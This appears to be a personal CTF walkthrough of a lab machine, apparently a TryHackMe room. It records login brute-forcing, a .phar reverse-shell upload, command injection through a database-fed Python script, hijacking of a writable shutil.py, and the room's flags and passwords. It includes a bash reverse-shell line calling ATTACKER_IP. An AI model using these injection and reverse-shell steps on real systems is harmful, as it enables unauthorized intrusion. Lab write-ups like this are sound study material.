/app = leads to a login page but only asks for password. 

====Brute Forced the form ====
password credential is "password" 
==================================

=================================
The CMS have a known exploit from exploit db but it's a useless shell. The good 
thing is i know what kind of file it accepts which is "*.phar"
=================================

Uploaded my reverse shell and that's how i hacked into the web server

====================
#LINPEAS NOTES
====================
Executables by users:
-/opt/test.py
/home/death/getDreams.py
----------------------
MYSQL FOUND
----------------------
Users found:
lucien = uid:1000
death = uid:1001
morpheus = uid:1002
====================

Based on the UID's. This means we have to escalate to Lucien -> Death -> Morpheus

====================
#LUCIEN
====================
-Lucien has a file found by linpeas that is in /opt/test.py
-Checking the file, it displays lucien's password which is "HeyLucien#@1999!"
-sudo -l runs = (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
-flag found in /home/lucien = THM{TH3_L1BR4R14N}
-mysql_history shows that lucien have an access to the database
-bash_history confirms that "mysql -u lucien -p"
-bash_history shows the credentials mysql -u lucien -plucien42DBPASSWORD. with
that information the password should be "lucien42DBPASSWORD"
#what's the connection between lucien and the ability to run the script that is
#displaying something from the databases????????
-Apparently, I can use the "getDreams.py" script to escalate my privelege to Death
by modifying the content of a column value. That's the connection with lucien's
ability to run the script.
-Tried using the same concept to display the getDreams.py content as Death but the 
password is still redacted. Sadge
-";/bin/bash;' gets me into death but it keeps giving a dumb shell -_-
-correct shell ==== ';/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";'
===================
#DEATH
===================
-Just like lucien, death has a file in /opt/getDreams.py
-getDreams.py has death's credential but the problem is his password is #redacted
-Death's flag = THM{1M_TH3R3_4_TH3M}
-Death's password credential = "!mementoMORI666!"
===================
#MORPHEUS
===================
-I can read into Morpheus as death
----------
Files:
-kingdom
-restore.py
----------
-I can run it but i don't have permission to write in the output path which is
/kingdom_backup/kindgom
-I noticed that there is a specific script that is showing on the error message
when i run "restore.py"
-Another good thing is I CAN FUCKING WRITE ON IT. 
-shutil.py has a copy2 function that has been imported within shutil function.
Changed the whole script with a revshell and it gave me ROOT ACCESS!!! 
-Morpheus flag = THM{DR34MS_5H4P3_TH3_W0RLD}
